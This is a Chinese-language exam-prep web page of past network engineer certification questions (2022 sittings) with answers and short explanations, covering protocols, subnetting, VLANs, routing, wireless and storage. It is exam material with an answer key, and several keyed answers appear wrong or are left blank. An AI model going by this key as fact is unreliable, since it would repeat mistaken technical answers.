alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>以下关于ICMP的叙述中，错误的是（）。</li></ol><p>A.ICMP封装在IP数据报的数据部分<br>B.ICMP消息的传递是可靠的<br>C.ICMP的IP协议必需的一个部门<br>D.ICMP可用来进行差错控制</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514221814324.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>某主机无法上网，查看本地连接后，发现只有发送包没有接收包，故障原因可能是（）。</li></ol><p>A.网线没有插好<br>B.DNS配置错误<br>C.IP地址配置错误<br>D.TCP&#x2F;IP协议故障</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>SNMP的传输层协议是（）。</li></ol><p>A.UDP<br>B.TCP<br>C.IP<br>D.ICMP</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514222000212.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>SNMP的休息类型不包含（）。</li></ol><p>A.Get-Request<br>B.Get-Next-Request<br>C.Get-Response<br>D.Get-Net-Response</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514222037399.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>下列IP地址中不能被路由器转发的是（）。</li></ol><p>A.192.168.102.78<br>B.101.10.10.251<br>C.127.16.23.1 (127.0.0.8&#x2F;8是环回地址)<br>D.172.33.22.16</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><p>52.53 IPv4地址192.168.10.201&#x2F;26的子网掩码是（），其网络号（）。</p><p>A.255.255.255.0<br>B.255.255.255.128<br>C.255.255.192.0<br>D.255.255.255.192<br>A.192.168.10.0<br>B.192.168.10.64<br>C.192.168.10.192<br>D.192.168.10.128</p></li></ul><blockquote><p>答：D,C</p></blockquote><ul><li><ol><li>路由器收到一个目标地址为201.46.17.4的数据包，应将该数据包发往（）子网。</li></ol><p>A.201.46.0.0&#x2F;21<br>B.201.46.16.0&#x2F;20<br>C.201.46.8.0&#x2F;22<br>D.201.46.20.0&#x2F;22</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>将连续的2个C类地址聚合后，子网掩码最长是（）位。</li></ol><p>A.24<br>B.23<br>C.22<br>D.21</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>以下关于命令user-interface vty 0的说法中，正确的是（）。</li></ol><p>A.配置用户等级为配置级<br>B.不允许连接虚拟终端<br>C.进入到交换机的远程登录用户界面<br>D.连接交换机不需要输入密码</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>在交换机上执行某命令显示结果如下，该命令的作用是（）。</li></ol><p>A.检查资源文件是否正确<br>B.对资源文件进行CRC校验 (check startup crc)<br>C.激活设备存储器中的License文件<br>D.系统回滚到上一个正确启动的版本状态</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514222541334.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>在以下命令执行结果中，Routing Tables描述路由标记的字段是（）。</li></ol><p>A.Proto<br>B.Pre<br>C.Cost<br>D.Flags</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514222622671.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>以下关于VLAN标识的叙述中，错误的是（）。</li></ol><p>A.VLAN ID用12bit表示<br>B.VLAN ID的扩展范围是1025-4096<br>C.VLAN ID标准范围可用于Ethernet的VLAN ID为1-1005<br>D.VLAN name用32个字符表示，可以是字母和数字</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514222721963.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>IEEE802.1Q规定VLAN的Tag字段中，用来定义帧的优先级的是（）。</li></ol><p>A.PRI<br>B.CFI<br>C.TPID<br>D.VID</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514222812808.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>()命令可通过VLAN对二层流量隔离，实现对网络资源控制。</li></ol><p>A.management-vlan (配置管理IP)<br>B.voice-vlan （语音流量VLAN）<br>C.mux-vlan<br>D.aggregate-vlan (将当前VLAN配置supperVLAN)</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>在交换机SWA上执行如下命令后，输出如下：</li></ol><p>A.SWA的桥D是32768<br>B.SWA是根桥<br>C.SWA工作是RSTP模式<br>D.SWA工作在MSTP模式</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514222919109.png" alt="img"></p><blockquote><p>答：D,CIST是单生成树，MSTP是多生成树；桥ID，优先级+ID</p></blockquote><ul><li><ol><li>在5G技术中，用于提升接入用户数的技术是（）。</li></ol><p>A.MIMO<br>B.NGV (下一代智能语音技术)<br>C.SOMA （自组织无线通信技术）<br>D.SDN</p></li></ul><blockquote><p>答：</p></blockquote><ul><li><ol><li>在100BaseT以太网中，若争用时间片为25.6us，某站点在发送帧时已经连接3次冲突，则基于二进制指数回退算法，该站点需等待的最短和最长时间是（）。</li></ol><p>A.0us和179.2us<br>B.0us和819.2us<br>C.25.6us和179.2us<br>D.25.6us和819.2us</p></li></ul><blockquote><p>答：</p></blockquote><blockquote><p>解析：[0,2^n-1], n&#x3D;3， [0,7], [0, 25.6*7&#x3D;179.2]</p></blockquote><ul><li><ol><li>以下关于2.4G和5G无线网络区别的说法中，错误的是（）。</li></ol><p>A.2.4G相邻信道间有干扰，5G相邻信道几乎干扰<br>B.5G比2.4G的传输速度快<br>C.穿过障碍物传播时5G比2.4G衰减小<br>D.5G比2.4G的工作频段范围大</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514223452066.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>某公司有20间办公室，均分布在办公大楼的同一楼层，计划在办公区域组建无线网络，为移动工作终端提供无线网络接入，要求连接一次网络后，均可以在各办公室无缝漫游，下列组网方案最合理的是（）。</li></ol><p>A.各办公室部署互联网接入无线路由器供终端接入<br>B.各办公室部署瘦AP供终端接入，并通过交换机连接到互联网接入路由器<br>C.各办公室部署胖AP 供终端接入，并通过交换机连接到<br>D.各办公室均部署瘦AP供终端接入，并通过交换机连接到AC和互联网接入路由器</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>FC-SAN存储通常通过光纤与服务器的（）连接。</li></ol><p>A.光口网卡<br>B.USB接口<br>C.光纤通道卡<br>D.RAID控制器</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514223812309.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>以下关于结构化布线系统的说法中，错误的是（）。</li></ol><p>A.工作区子系统是网络管理人员的值班场所，需要配备不间断电源<br>B.干线区子系统实现各楼层配线间和建筑物设备间的互联<br>C.设备间子系统有建筑物进户线、交换设备等设施组成<br>D.建筑群子系统实现各建筑物设备间的互联</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514223832898.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>以下关于三层模型核心层设计的说法中，错误的是（）。</li></ol><p>A.核心层是整个网络的高速骨干，应有冗余设计<br>B.核心层应有包过滤的策略路由设计，提升网络安全防护<br>C.核心层连接的设备不应过多<br>D.需要访问互联网时，核心层应包括一条或多条连接到外部网络的连接</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514223930291.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>计算机等级保护第三级对信息系统用户身份鉴定的要求是：在第二级要求基础上，（）。</li></ol><p>A.应设置登陆密码复杂度要求并定期更换<br>B.应具有登录失败处理功能<br>C.应采取措施，防止鉴别信息在传输过程中被窃听<br>D.应采取双因子登陆认证，且其中一种鉴别技术应至少使用密码技术</p></li></ul><blockquote><p>答：D</p></blockquote><h2 id="2022年11月"><a href="#2022年11月" class="headerlink" title="2022年11月"></a>2022年11月</h2><ul><li><ol><li>下列存储介质总，读写速度最快的是（）。</li></ol><p>A.光盘<br>B.硬盘<br>C.内存<br>D.Cache</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250515170045822.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>使用DMA不可以实现数据（）。</li></ol><p>A.从内存到外存的传输<br>B.从硬盘到光盘的传输<br>C.从内存到I&#x2F;O接口的传输<br>D.从I&#x2F;O接口到内存的传输</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250515213029174.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>下列I&#x2F;O类型接口中，采用并行总线的是（）。</li></ol><p>A.USB （串行）<br>B.UART<br>C.PCI<br>D.I2C</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>以下关于进程和现场的描述中，错误的是（）。</li></ol><p>A.进程是执行中的程序<br>B.一个进程可以包含多个线程<br>C.一个线程可以属于多个进程<br>D.线程的开销比进程的小</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>下列操作系统中，（）与另外三种操作系统的内核种类不同。</li></ol><p>A.Windows10<br>B.Ubuntu14.04<br>C.Centos7.0<br>D.中标麒麟6.0</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>下列功能模块中，不属于操作系统内核功能模块的是（）。</li></ol><p>A.存储管理<br>B.设备管理<br>C.文件管理<br>D.版本管理</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250515213709026.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>在网络工程项目全流程中，项目测试的测试目标来自于（）阶段。</li></ol><p>A.需求分析<br>B.网络设计<br>C.实施<br>D.运维</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>网络建设完成后需要进行日常维护，维护的内容不包括（）。</li></ol><p>A.网络设备管理<br>B.操作系统维护<br>C.网络安全管理<br>D.网络规划设计</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>下列描述中，违反《中华人民共和国网络安全法》的是（）。</li></ol><p>A.网络运营者应当对其收集的用户信息严格保密<br>B.网络运营者不得篡改、毁损其收集的个人信息<br>C.网络运营者使用收集的个人信息可以不经被收集者同意<br>D.网络运营者应当建立网络信息安全投诉、举报制度</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250515214054862.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>五类、六类网线的标准是由（）制定的。</li></ol><p>A.ISO&#x2F;IEC JTC1 SC25委员会<br>B.中国国家标准化管理委员会 (SAC)<br>C.中国标准化协会 (CAS)<br>D.美国国家标准协会 (ANSZ)</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>若8进制信号的信号速率是4800Baud，则信道的数据速率为（）kb&#x2F;s。</li></ol><p>A.9.6<br>B.14.4<br>C.19.2<br>D.38.4</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250515214330874.png" alt="img"></p><blockquote><p>答：B</p></blockquote><blockquote><p>解析：4800log2^8, 4800x3&#x3D;14400b&#x2F;s, 14.4kb&#x2F;s</p></blockquote><ul><li><ol><li>下列传输方式中属于基带传输的是（）。</li></ol><p>A.PSK编码传输 （相位）<br>B.PCM编码传输 (时分复用)<br>C.QAM编码传输 （幅度，正交）<br>D.SSB传输 (调制频率)</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>依据《数据中心设计规范》，在设计数据中心时，成行排列的机柜，其长度大于（）米时，两端应设有通道。</li></ol><p>A.5<br>B.6<br>C.7<br>D.8</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250515214625900.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>假设换一个10Mb&#x2F;s的适配器使用曼彻斯特编码向链路发送全1的比特流，从适配器发出的型号每秒将有（）个跳变。</li></ol><p>A.每秒1000万<br>B.每秒500万<br>C.每秒2000万<br>D.没有跳变</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250515214735897.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>5G无线通信采用的载波调制技术是（）。</li></ol><p>A.OFDM<br>B.F-OFDM<br>C.QPSK<br>D.256QAM</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250515215018557.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>下列认证方式中，安全性较低的是（）。</li></ol><p>A.生物认证<br>B.多因子认证<br>C.口令认证<br>D.盾认证</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>Windows平台网络命令Ping和Tracert的实现依赖于（）。</li></ol><p>A.TCP套接字 (流套接字)<br>B.UDP套接字 （数据报套接字）<br>C.原始套接字<br>D.IP套接字</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>SONET采用的成帧方法是（）。</li></ol><p>A.码分复用<br>B.空分复用<br>C.时分复用<br>D.频分复用</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>下列关于IEEE802.11a的描述中，不正确的是（）。</li></ol><p>A.工作在2.4GHz频率<br>B.使用OFDM调制技术<br>C.数据速率最高可达54Mbps<br>D.可支持语音、数据、图像业务</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250515215436696.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>一个IP报文经过路由器处理后，若TTL字段值变为0，则路由器会进行的操作是（）。</li></ol><p>A.向IP报文的源地址发送一个出错信息，并继续转发该报文<br>B.向IP报文的源地址发送一个出错信息，并丢弃该报文<br>C.继续转发报文，在报文中做出标记<br>D.直接丢弃该IP报文，即不转，也不发生错误信息</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>当IP报文从一个网络转发到另外一个网络时，（）。</li></ol><p>A.IP地址和MAC地址均发生改变<br>B.IP地址改变、但MAC地址不变<br>C.MAC地址改变，但IP地址不变<br>D.MAC地址改变，IP地址都不变</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>以下网络控制参数中，不随报文传送到对端实体的是（）。</li></ol><p>A.接收进程<br>B.上层协议<br>C.接收缓存大小<br>D.拥塞窗口大小</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><p>23.24.RIP路由协议是一种基于（）为度量的路由协议，其中RIPv1使用广播方式进行路由更新，RIPv2使用组播方式进行路由更新，其组播地址是（）。</p><p>A.跳数<br>B.带宽<br>C.负载<br>D.延迟<br>A.224.0.0.5<br>B.224.0.0.6<br>C.224.0.0.9<br>D.224.0.0.10</p></li></ul><blockquote><p>答：A,c</p></blockquote><ul><li><ol><li>在下图的拓扑结构中，RouterA和RouterB均运行RIPv1协议，在RouterA上上使用（）命令即可完成路由信息的宣告。</li></ol></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250515215813288.png" alt="img"></p><pre><code class="hljs dns"><span class="hljs-keyword">A</span>.network <span class="hljs-number">10.10.0.0</span> network <span class="hljs-number">10.10.10.0</span> network <span class="hljs-number">10.10.20.0</span>B. network <span class="hljs-number">10.10.0.0</span> <span class="hljs-number">255.255.255.0</span>   network <span class="hljs-number">10.10.10.0</span> <span class="hljs-number">255.255.255.0</span>   network <span class="hljs-number">10.10.20.0</span> <span class="hljs-number">255.255.255.0</span>C. network <span class="hljs-number">10.10.0.0</span> <span class="hljs-number">255.255.0.0</span>D. network <span class="hljs-number">10.0.0.0</span>复制代码</code></pre><blockquote><p>答：D</p></blockquote><ul><li>26.27. 在MA网络中运行OSPF路由协议，路由协议会根据路由器的配置信息来确认Router-ID，管理员依次配置了下面接口，当前的Router-ID是（），如管理员执行reset ospf process命令使用OSPF协议后，Route-ID是（）。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250515092246389.png" alt="img"></p><pre><code class="hljs dns"><span class="hljs-keyword">A</span>.<span class="hljs-number">10.0.1.254</span>B.<span class="hljs-number">10.1.12.10</span>C.<span class="hljs-number">12.1.1.2</span>D.<span class="hljs-number">12.1.1.1</span><span class="hljs-keyword">A</span>.<span class="hljs-number">10.0.1.254</span>B.<span class="hljs-number">101.12.10</span>C.<span class="hljs-number">12.1.1.2</span>D.<span class="hljs-number">12.1.1.1</span>复制代码</code></pre><blockquote><p>答：A,C</p></blockquote><ul><li><ol><li>Telnet协议是一种（）的远程登录协议。</li></ol><p>A.安全<br>B.B&#x2F;S模式<br>C.基于TCP<br>D.分布式</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>下列关于HTTPS和HTTP协议的描述中，错误的是（）。</li></ol><p>A.HTTPS协议使用加密传输<br>B.HTTPS协议默认服务端口号是443<br>C.HTTP协议默认服务端口是80<br>D.电子支付类网站应使用HTTP协议</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250515220739839.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><p>30.31. 电子邮件客户端通过发起对（）服务器的（）端口的TCP连接进行邮件发送。</p><p>A.POP3 （只收,110）<br>B.SMTP (发送)<br>C.HTTP<br>D.IMAP (只收,143)<br>A.23<br>B.25<br>C.110<br>D.143</p></li></ul><blockquote><p>答：B,B</p></blockquote><ul><li><ol><li>以下关于IPv6和IPv4报文头区别比较的说法中，错误的是（）。</li></ol><p>A.IPv4的头部是变长的，IPv6的头部是定长的<br>B.IPv6与IPv4均有“校验和”字段<br>C.IPv6中的HOP Limit字段作用类似于IPv4中的TTL字段<br>D.IPv6中的Traffic Class字段作用类似于IPv4中的Tos字段 （服务类型）</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>在DNS服务器中，区域的邮件服务器及其优先级由（）资源记录定义。</li></ol><p>A.SOA<br>B.NS<br>C.PRT<br>D.MX</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250515221228788.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>安装Linux时必须创建的分区是（）。</li></ol><p>A.&#x2F;root<br>B.&#x2F;home<br>C.&#x2F;bin<br>D.&#x2F;</p></li></ul><blockquote><p>答：D</p></blockquote><blockquote><p>解析：（&#x2F;,swap）</p></blockquote><ul><li><ol><li>在Windows中，使用（）命令来清除本地DNS缓存</li></ol><p>A.ipconfig&#x2F;flushdns<br>B.ipconfig&#x2F;displaydns<br>C.ipconfig&#x2F;registerdns<br>D.ipconfig&#x2F;renew</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><p>36~38. 某主机的MAC地址为00-FF-12-CD-10-22，其IP地址配置选项设置为“自动配置”，该主机可通过发送（）报文以查找DHCP服务器，并请求IP地址配置信息，报文的源MAC地址是（），源IP地址是（）。</p><p>A.DHCPdiscover<br>B.DHCPrequest<br>C.DHCPrenew<br>D.DHCPack<br>A.0:0:0:0:0:0:0:0<br>B.FF:FF:FF:FF:FF:FF:FF:FF<br>C.00-FF-12-CD-10-22<br>D.00-FF-12-CD-FF-FF<br>A.127.0.0.1<br>B.255.255.255.255<br>C.0.0.0.0<br>D.169.254.18.254</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250515221838916.png" alt="img"></p><blockquote><p>答：A,C,C</p></blockquote><ul><li><ol><li>以下关于HTML方式的描述中，错误的是（）。</li></ol><p>A.GET方法用于向服务器请求页面，该请求可被收藏为标签<br>B.GET请求没有长度限制<br>C.POST方法用于数据发送到服务器以创建或者修改数据<br>D.POST请求不会被保留在浏览器的历史记录中</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250515222230287.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>在Windows平台上，要为某主机手动添加一条ARP地址映射，下面的命令正确的是（）。</li></ol><p>A.arp -a 157.55.85.212 00-aa-00-62-c2-09<br>B.arp -g 157.55.85.212 00-aa-00-62-c2-09<br>C.arp -v 157.55.85.212 00-aa-00-62-c2-09<br>D.arp -s 157.55.85.212 00-aa-00-62-c2-09</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><p>41.42. 某信息系统内网IP为10.0.10.2，域名解析的公网IP为113.201.123.14，现需要在出口防火墙配置NAT，使得外部用户能正常访问该系统。其中：NAT模式应设置为（），源地址应配置为（）。</p><p>A.源NAT<br>B.一对一源NAT<br>C.一对一目的NAT<br>D.不做转换<br>A.任意<br>B.10.0.10.2<br>C.192.168.0.1<br>D.113.201.123.14</p></li></ul><blockquote><p>答：C,A</p></blockquote><ul><li><p>43.44. X.509数据证书标准推荐使用的密码算法是（），而国密SM2数据证书采用的公钥密码算法是（）。</p><p>A.RSA<br>B.DES<br>C.AES<br>D.ECC<br>A.RSA<br>B.DES<br>C.AES<br>D.ECC</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250515222726600.png" alt="img"></p><blockquote><p>答：A,D</p></blockquote><blockquote><p>解析：X.509支持3种非对称加密算法：RAS&#x2F;DSA&#x2F;DH</p></blockquote><ul><li><ol><li>网络管理员在安全防护系统看到如下日志，说明该信息系统受到（）攻击。</li></ol><p>A.SQL注入<br>B.DDos<br>C.XSS (跨站脚本攻击)<br>D.HTTP头</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>在SNMP协议中TRAP上报是通过UDP协议的（）端口。</li></ol><p>A.161<br>B.162<br>C.163<br>D.164</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250515222950300.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>在OSPF的广播网络中，有4台服务器的RouterA、RouterB、RouterC和RouterD，其优先级分别为2、1、1和0，RouterID分别为192.168.1.1、192.168.2.1、192.168.3.1和192.168.4.1。若在此4台路由器上同时启用OSPF协议，OSPF选出的BDR为（）。</li></ol><p>A.RouterA<br>B.RouterB<br>C.RotuerC<br>D.RouterD</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>在生成快速转发表的过程中，五元组是指（）。</li></ol><p>A.源MAC地址、目的MAC地址、协议号、源IP地址、目的IP地址<br>B.物理接入、目的IP地址、IP地址、端口号、协议号<br>C.源IP地址、目的IP地址、源端口号、目的端口号、协议号<br>D.物理接口、源IP地址、目的IP地址、源端口号、目的端口号</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>可以发出SNMP GetRequest的网络实体是（）。</li></ol><p>A.Agent<br>B.Manager<br>C.Client<br>D.Server</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250515223242308.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>SNMP报文中不包括（）。</li></ol><p>A.版本号<br>B.协议数据单元<br>C.团体名<br>D.优先级</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>在IPv4地址192.168.1.0&#x2F;24中，表示主机的二进制位数是（）位。</li></ol><p>A.8<br>B.16<br>C.24<br>D.32</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><p>52~54.某公司部门1到部门4的主机数量需求分别是4、10、12、15，网工小李要对这4个部门的IP地址进行规划。以下选项中，（）可作为网络号使用，其对应的子网掩码是（），该网络号和子网掩码可用于（）的地址部署。</p><p>A.192.168.28.10<br>B.192.168.28.20<br>C.192.168.27.30<br>D.192.168.27.40<br>A.255.255.255.192<br>B.255.255.255.224<br>C.255.255.255.240<br>D.255.255.255.248<br>A.部门1<br>B.部门2<br>C.部门3<br>D.部门4</p></li></ul><blockquote><p>答：D，D,A</p></blockquote><blockquote><p>解析：3,4,4,5个零，40有3个0，</p></blockquote><ul><li><ol><li>将地址段172.16.32.0&#x2F;24、172.16.33.0&#x2F;24、172.16.34.0&#x2F;24、172.16.35.0&#x2F;24进行聚合后得到的地址是（）。</li></ol><p>A.172.16.32.0&#x2F;24<br>B.172.16.32.0&#x2F;23<br>C.172.16.32.0&#x2F;22<br>D.172.16.32.0&#x2F;21</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>下列命令片段含义显示的内容不包括（）。</li></ol></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250515103014462.png" alt="img"></p><pre><code class="hljs css"><span class="hljs-selector-tag">A</span><span class="hljs-selector-class">.SNMPv3</span>用户状态<span class="hljs-selector-tag">B</span>.认证方式C<span class="hljs-selector-class">.SNMPv3</span>设备的引擎IDD<span class="hljs-selector-class">.MIB</span>节点的统计信息复制代码</code></pre><blockquote><p>答：D</p></blockquote><ul><li><ol><li>使用（）命令可以查看IS-IS协议的概要信息。</li></ol><p>A.display isis interface<br>B.display isis spf-log<br>C.dispaly isis brief<br>D.display isis peer</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>下列路由表信息中显示的区域内部网络总数是（）。</li></ol><p>A.0<br>B.3<br>C.4<br>D.1</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250515224057710.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250515224147767.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>GVRP可以实现跨交换机进行动态注册和删除，以下关于GVRP协议的描述中，错误的是（）。</li></ol><p>A.GVRP是GARP的一种应用，有IEEE制定<br>B.交换机之间的协议报文交互必须在VLAN Trunk链路上进行<br>C.GVRP协议所支持的VLANID范围为1-1001 (1-4094)<br>D.GVRP配置时需要在每一台交换机上建立VLAN</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><p>60.61 VLAN配置命令port-isolate enable 的含义是（），配置命令port trunk allow-pass vlan 10 to 30的含义是（）。</p><p>A.不同VLAN二层互通<br>B.同一VLAN下二层隔离<br>C.同一VLAN下三层隔离<br>D.不同VLAN三层互通<br>A.配置接口属于VLAN10-VLAN30<br>B.配置接口属于VLAN10、VLAN30<br>C.配置接口不属于VLAN10-VLAN30<br>D.配置接口不属于VLAN10、VLAN30</p></li></ul><blockquote><p>答：B,A</p></blockquote><ul><li><ol><li>由IEEE制定的最早的STP标准是（）。</li></ol><p>A.IEEE802.1D<br>B.IEEE802.1Q<br>C.IEEE802.1W<br>D.IEEE802.1S</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>5G网络采用（）可将5G网络分割成多张虚拟网络，每个虚拟网络的接入、传输和核心网是逻辑独立的，任何一个虚拟网络发生故障都不会影响到其他虚拟网络。</li></ol><p>A.网络切片技术<br>B.边缘计算技术<br>C.网络隔离技术<br>D.软件定义网络技术</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>IEEE802.3Z是（）标准。</li></ol><p>A.标准以太网 (802.3)<br>B.快速以太网 (802.3u)<br>C.千兆以太网 (802.3z&#x2F;ab)<br>D.万兆以太网 (802.3au)</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>某写字楼无线网络采用相邻两间办公室共用1个无线AP的设计方案，该方案可能会造成无线信号衰减，造成型号衰减的主要原因是（）。</li></ol><p>A.传输距离太长<br>B.障碍物阻挡<br>C.无线太少<br>D.信道间互相干扰</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>下列WiFi认证方式中，（）使用了AES加密算法，安全性更高。</li></ol><p>A.开放式<br>B.WPA<br>C.WPAS2<br>D.WEP</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>（）存储方式常使用多副本技术实现数据冗余。</li></ol><p>A.DAS<br>B.NAS<br>C.SAN<br>D.分布式</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250515225049238.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>结构化布线系统中，实现各楼层设备间子系统互联的是（）。</li></ol><p>A.管理子系统<br>B.干线子系统<br>C.工作区子系统<br>D.建筑群子系统</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250515225318038.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>以下关于网络需求分析的说法中，错误的是（）。</li></ol><p>A.应收集不同用户的需求<br>B.根据不同类型应用的业务特性，归纳和梳理出各自的网络需求<br>C.应撰写输出网络规划与设计报告<br>D.应充分考虑数据备份的网络需求</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>下列属于网络安全等级保护第三级且是在上一级基础上增加的安全要求是（）。</li></ol><p>A.应对登录的用户分配账号和设置权限<br>B.应在关键网络节点处监视网络攻击行为<br>C.应具有登录失败处理功能限制非法的登录次数<br>D.应对关键设备实施地磁屏蔽</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250515225633508.png" alt="img"></p><blockquote><p>答：D</p></blockquote><h2 id="2022年5月"><a href="#2022年5月" class="headerlink" title="2022年5月"></a>2022年5月</h2><ul><li><ol><li>计算机操作的最小时间单位是（）。</li></ol><p>A.指令周期<br>B.时钟周期<br>C.总线周期<br>D.CPU周期</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250517223336601.png" 